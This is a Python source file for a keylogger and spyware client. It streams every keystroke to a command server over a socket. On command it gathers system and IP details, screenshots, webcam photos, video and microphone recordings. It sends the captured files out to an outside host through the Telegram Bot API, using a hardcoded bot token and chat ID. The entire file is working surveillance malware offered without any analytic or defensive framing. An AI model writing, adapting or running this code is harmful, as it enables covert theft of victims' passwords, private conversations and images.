import socket
import threading
from pynput import keyboard  # Import from pynput library for keyboard listening
import platform
import getpass
from requests import get
from PIL import ImageGrab
import cv2
import sounddevice as sd
from scipy.io.wavfile import write
import requests
import os
from datetime import datetime

host="localhost"
port=8889
#function of klogger
file_path = "function_files"
extend = "\\"
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
screenshot_information = "screenshot.png"
photo="photo.jpg"
audio_information = "audio.wav"
# for telegram
TOKEN = "6769981272:AAF-tsQ3wVvSS-ZuxqGWNW0yP6yuRnWZjQU"
chat_id = "6508578990"
TELEGRAM_FILE_URL = f'https://api.telegram.org/bot{TOKEN}/sendDocument'

#end for telegram

#Start computer_information
def computer_information():
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        username = getpass.getuser()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Username: " + username + "\n")
        f.write("Private IP Address: " + IPAddr + "\n\n")


#End computer_information
#Start ScreenShot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
#End Screenshot
#Start take photo   
def take_photo():
    # Open the camera
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Error: Unable to access camera")
        return

    # Capture frame-by-frame
    ret, frame = cap.read()

    # Save the captured frame to file
    cv2.imwrite(file_path + extend + photo, frame)

    # Release the camera
    cap.release()
    cv2.destroyAllWindows()

    print("Photo saved to", file_path)
        
#End take photo
    
#Start take video
    
def capture_video(duration):
    output_file=file_path + "\\video.avi"
    # Open the camera
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Error: Unable to access camera")
        return

    # Define the codec and create VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(output_file, fourcc, 20.0, (640, 480))

    # Capture video for the specified duration
    start_time = cv2.getTickCount()
    while (cv2.getTickCount() - start_time) / cv2.getTickFrequency() < duration:
        ret, frame = cap.read()
        if ret:
            # Write the frame to the output file
            out.write(frame)
            # Display the frame
            #cv2.imshow('Frame', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        else:
            break

    # Release everything when done
    cap.release()
    out.release()
    cv2.destroyAllWindows()

    print("Video saved to", output_file)


#End take video
#Start microphone
    
def microphone(seconds):
    fs = 44100

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)
#End microphone
    #telegram
def telegsend():
    current_datetime = datetime.now()
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={current_datetime}"
    requests.get(url).json() # this sends the message
    fileopenfortele("screenshot.png")
    fileopenfortele("photo.jpg")
    fileopenfortele("video.avi")
    fileopenfortele("audio.wav")


    # end telegram
def fileopenfortele(file):
    if os.path.exists(file):
        with open(file, 'rb') as file:
    # Prepare the HTTP POST request
            files = {'document': file}
            data = {'chat_id': chat_id}

    # Send the file via HTTP POST request
            response = requests.post(TELEGRAM_FILE_URL, files=files, data=data)

    # Check if the file was sent successfully
        if response.status_code == 200:
            print('File sent successfully!')
        else:
            print(f'Failed to send file. Status code: {response.status_code}')
    else:
        print('File does not exist, skipping sending.')

def send_file(file_path,sock,command):
    # Open the file in binary mode for reading
    
    if command==1: #send computer information as text
        with open(file_path, 'rb') as file:
        
         # Read the content of the file
            file_content = file.read()
            
            # Send the content over the socket
            sock.sendall("T".encode()) #first send datatype to identify whether send data is image or text.
            sock.sendall(file_content)
            print("Text Sent")
            
            

    if command == 2:#send screenshot and photo as image

        with open(file_path, 'rb') as file:
            image_data = file.read()
            image_length = len(image_data)
            sock.sendall("I".encode())
            sock.sendall(image_length.to_bytes(4, byteorder='big'))
            sock.sendall(image_data)
            print("Image sent")

    print("File sent successfully.")

def fun(num):
    if (num=='1'):
        computer_information()
        send_file("function_files\\systeminfo.txt",client_socket,1)
    elif (num=='2'):
        screenshot()
        send_file("function_files\\screenshot.png",client_socket,2)
    elif (num=='3'):
        take_photo()
        send_file("function_files\\photo.jpg",client_socket,2)
    elif (num=='4'):
        capture_video(10)
        send_file("function_files\\video.avi",client_socket,2)
    elif (num=='5'):
        microphone(10)
        send_file("function_files\\audio.wav",client_socket,2)
    elif (num=='6'):
        telegsend()
        
    else:
        print("No Fun")

def receive_messages(sock):
    while True:
        data = sock.recv(1024).decode()
        if data and data in ('1','2','3','4','5','6'):
            print("Received:", data)
            fun(data)


def send_message(sock, message):
    sock.sendall("T".encode())
    sock.sendall(message.encode())

def on_press(key):
    try:
        # Convert the key press to a string
        message = str(key)
        send_message(client_socket, message)
    except AttributeError:
        # If a special key (not a character) is pressed, handle it accordingly
        if key == keyboard.Key.enter:
            message = "\n"
            send_message(client_socket, message)



# Create a socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server   
server_address = (host, port)
client_socket.connect(server_address)

# Start a thread to receive messages
receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
receive_thread.start()

# Start the keyboard listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
